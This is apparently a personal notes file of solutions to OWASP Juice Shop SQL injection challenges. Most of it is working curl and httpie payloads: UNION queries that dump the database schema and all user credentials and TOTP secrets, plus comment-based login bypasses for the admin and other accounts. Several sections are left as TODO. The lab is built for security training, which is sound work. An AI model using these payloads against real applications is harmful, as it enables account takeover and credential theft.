# Injection

Resources

* [SQL injection](https://portswigger.net/web-security/sql-injection)
* [NoSQL injection](https://portswigger.net/web-security/nosql-injection)

## Reconnaissance

Intercept all requests and look for a request with parameters to fuzz
```bash
# verify vulnerability
curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo';" | jq
# output
{
  "error": {
    "message": "SQLITE_ERROR: near \";\": syntax error",
    "stack": "Error: SQLITE_ERROR: near \";\": syntax error",
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%foo';%' OR description LIKE '%foo';%') AND deletedAt IS NULL) ORDER BY name"
  }
}
```

## Order the Christmas special offer of 2014

```bash
# find ProductId=10
curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=2014%'+AND+deletedAt+IS+NOT+NULL));--" | jq

TOKEN=<REDACTED>

curl http://juiceshop:3000/api/BasketItems/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${TOKEN}" \
  --data-raw '{"ProductId":10,"BasketId":"6","quantity":1}'
```

## Exfiltrate the entire DB schema definition via SQL Injection

```bash
# Products table has 9 columns, add N static columns in order to match them and fix
# "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns"
curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'))+UNION+SELECT+name,sql,'a','b','c','d','e','f','g'+FROM+sqlite_master+WHERE+type='table';--" | jq '.data | map({"id":.id,"name":.name})'
```

## Log in with the (non-existing) accountant without ever registering that user

```bash
# trigger error
http http://juiceshop:3000/rest/user/login email=\' password=foo
# output
{
    "error": {
        "message": "SQLITE_ERROR: near \"acbd18db4cc2f85cedef654fccc4a4d8\": syntax error",
        "name": "SequelizeDatabaseError",
        "original": {
            "code": "SQLITE_ERROR",
            "errno": 1,
            "sql": "SELECT * FROM Users WHERE email = ''' AND password = 'acbd18db4cc2f85cedef654fccc4a4d8' AND deletedAt IS NULL"
        },
        "parameters": {},
        "parent": {
            "code": "SQLITE_ERROR",
            "errno": 1,
            "sql": "SELECT * FROM Users WHERE email = ''' AND password = 'acbd18db4cc2f85cedef654fccc4a4d8' AND deletedAt IS NULL"
        },
        "sql": "SELECT * FROM Users WHERE email = ''' AND password = 'acbd18db4cc2f85cedef654fccc4a4d8' AND deletedAt IS NULL",
        "stack": "Error\n    at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /juice-shop/node_modules/sequelize/lib/sequelize.js:315:28\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)"
    }
}

# add static user to result
http http://juiceshop:3000/rest/user/login email="' UNION SELECT 999,'myUsername','acc0unt4nt@juice-sh.op','myPassword','accounting','','0.0.0.0','','','1','2023-10-28 15:47:25.395 +00:00','2023-10-28 15:47:25.395 +00:00','NULL' FROM Users'--"
```

## Log in with the administrator's user account

```bash
http http://juiceshop:3000/rest/user/login email="admin@juice-sh.op'--"
```

## Log in with Bender's user account

```bash
http http://juiceshop:3000/rest/user/login email="bender@juice-sh.op'--"
```

## Log in with Jim's user account

```bash
http http://juiceshop:3000/rest/user/login email="jim@juice-sh.op'--"
```

## Let the server sleep for some time

```bash
TODO
```

## All your orders are belong to us

```bash
TODO
```

## Update multiple product reviews at the same time

```bash
TODO
```

## Infect the server with juicy malware by abusing arbitrary command execution

```bash
TODO
```

## Retrieve a list of all user credentials via SQL Injection

```bash
curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'))+UNION+SELECT+id,username,email,password,role,deluxeToken,totpSecret,isActive,createdAt+FROM+Users;--" | jq '.data'
```
